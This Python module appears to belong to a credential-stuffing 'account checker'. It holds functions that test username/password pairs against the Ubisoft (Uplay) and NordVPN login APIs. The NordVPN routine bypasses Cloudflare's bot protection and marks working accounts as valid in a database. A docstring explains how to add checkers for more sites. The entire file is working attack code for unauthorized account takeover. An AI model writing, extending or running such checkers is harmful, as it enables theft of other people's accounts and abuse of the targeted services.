import base64
import logging as log

from manage_requests import ManageRequests


def uplay(usr, pwd, mr):
    mr: ManageRequests
    usr: str
    pwd: str
    site_post = "https://public-ubiservices.ubi.com/v3/profiles/sessions"
    creds = str.encode(usr + ":" + pwd)
    encoding = base64.b64encode(creds).decode()
    mr.req.headers = {"Content-Type": "application/json", "Ubi-AppId": "e06033f4-28a4-43fb-8313-6c2d882bc4a6",
                      "Authorization": "Basic " + encoding}
    res = mr.post_with_checks(site_post)
    if res:
        if res.status_code == 200:
            mr.db.update_result(usr, pwd, "uplay", "True")
            log.info("Account valid {}".format(usr))
        else:
            mr.db.update_result(usr, pwd, "uplay", "False")
            log.info("Account error {} {}".format(usr, pwd))
    else:
        mr.db.update_result(usr, pwd, "uplay", "False")
        log.info("Account error {} {}".format(usr, pwd))


def nordvpn(usr, pwd, mr):
    """
    Custom functions must have 3 params: username and password to check, and a ManageRequests object
    The MR object has all the primitives that you need.
    Remember to update the database via mr.db
    """

    sitePost = "https://ucp.nordvpn.com/api/v1/users/login"
    siteGet = "https://ucp.nordvpn.com/login"
    # Retrieve CF valid cookie

    cookies = mr.bypass_cf(siteGet)
    # change proxy account
    res = mr.post_with_checks(sitePost,
                              data={"username": usr, "password": pwd}, cookies=cookies)
    res = dict(res.cookies).get("token", None)

    # check if inside the cookie the token is set, if positive the account is valid
    if res:
        mr.db.update_result(usr, pwd, "nordvpn", "True")
        mr.db.update_result(usr, pwd, "nordvpnProxy", "True")
        log.info("Account valid {}".format(usr))
    else:
        mr.db.update_result(usr, pwd, "nordvpn", "False")
        mr.db.update_result(usr, pwd, "nordvpnProxy", "False")
        log.info("Account error {} {}".format(usr, pwd))
    log.info("-------------------------------")
    mr.req.cookies.clear()
